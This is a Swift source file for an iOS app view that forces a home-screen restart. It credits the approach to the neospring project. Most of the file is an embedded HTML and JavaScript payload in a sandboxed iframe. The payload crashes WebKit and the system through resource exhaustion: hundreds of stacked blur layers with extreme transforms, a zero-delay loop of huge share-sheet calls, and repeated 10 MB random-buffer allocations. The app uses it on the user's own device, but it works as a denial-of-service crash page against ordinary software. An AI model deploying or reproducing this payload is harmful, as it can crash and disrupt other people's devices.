//
//  NeoSpringView.swift
//  GestaltEdit
//
//  Based on rooootdev/neospring. The WebKit respring approach was developed
//  by neonmodder123 and ported to Swift by skadz108.
//  https://github.com/rooootdev/neospring
//

import SwiftUI
import WebKit

struct NeoSpringView: View {
    @State private var startsRespring = false

    var body: some View {
        ZStack {
            Color.black
            ProgressView()
                .tint(.white)

            if startsRespring {
                NeoSpringWebView()
                    .brightness(-1)
            }
        }
        .ignoresSafeArea()
        .task {
            try? await Task.sleep(for: .milliseconds(250))
            startsRespring = true
        }
    }
}

private struct NeoSpringWebView: UIViewRepresentable {
    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.loadHTMLString(Self.document, baseURL: nil)
        return webView
    }

    func updateUIView(_ webView: WKWebView, context: Context) {}

    private static let document = #"""
    <!DOCTYPE html>
    <html>
      <body>
        <iframe id="frame" srcdoc="" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts"></iframe>
        <script>
          const frame = document.getElementById('frame');
          const payload = `
            <html>
              <body>
                <script>
                  const container = document.createElement('div');
                  container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                  document.body.appendChild(container);

                  for (let i = 0; i < 500; i++) {
                    const layer = document.createElement('div');
                    layer.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
                    container.appendChild(layer);
                  }

                  setInterval(() => {
                    navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
                    const bytes = new Uint8Array(1024 * 1024 * 10);
                    crypto.getRandomValues(bytes);
                  }, 0);
                <\/script>
              </body>
            </html>
          `;
          frame.srcdoc = payload;
        </script>
      </body>
    </html>
    """#
}
